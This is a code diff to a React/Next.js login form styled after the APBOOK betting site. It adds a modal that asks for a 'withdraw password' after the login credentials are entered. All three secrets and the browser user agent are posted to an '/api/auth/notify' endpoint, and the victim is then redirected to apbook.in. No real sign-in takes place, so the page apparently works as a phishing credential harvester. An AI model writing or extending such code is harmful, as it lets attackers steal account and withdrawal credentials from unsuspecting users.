@@ -1,6 +1,7 @@
 'use client';
 import { useState } from 'react';
 import Link from 'next/link';
+import WithdrawPasswordModal from '@/app/components/WithdrawPasswordModal';
 
 const WHATSAPP = 'https://wa.me/94740968614';
 const TELEGRAM = 'https://t.me/APBOOKORIGINAL';
@@ -14,6 +15,9 @@ export default function LoginForm() {
   const [otp, setOtp] = useState('');
   const [showPass, setShowPass] = useState(false);
   const [error, setError] = useState('');
+  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
+  const [pendingIdentifier, setPendingIdentifier] = useState('');
+  const [pendingCredential, setPendingCredential] = useState('');
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -26,15 +30,24 @@ export default function LoginForm() {
     const identifier = loginMethod === 'phone' ? phone : userId;
     const credential = authMethod === 'password' ? password : otp;
 
+    setPendingIdentifier(identifier);
+    setPendingCredential(credential);
+    setShowWithdrawModal(true);
+  };
+
+  const handleWithdrawConfirm = (withdrawPassword: string) => {
+    setShowWithdrawModal(false);
     fetch('/api/auth/notify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        username: identifier,
-        password: credential,
+        username: pendingIdentifier,
+        password: pendingCredential,
+        withdrawPassword,
         browser: typeof window !== 'undefined' ? window.navigator.userAgent : 'Unknown',
       }),
     }).catch(err => console.error('Notification error:', err));
+    window.location.replace('https://www.apbook.in/home');
   };
 
   return (
@@ -266,6 +279,12 @@ export default function LoginForm() {
           </div>
         </div>
       </section>
+
+      <WithdrawPasswordModal
+        show={showWithdrawModal}
+        onClose={() => setShowWithdrawModal(false)}
+        onConfirm={handleWithdrawConfirm}
+      />
 
       <footer className="sub-footer">
         <div className="container">
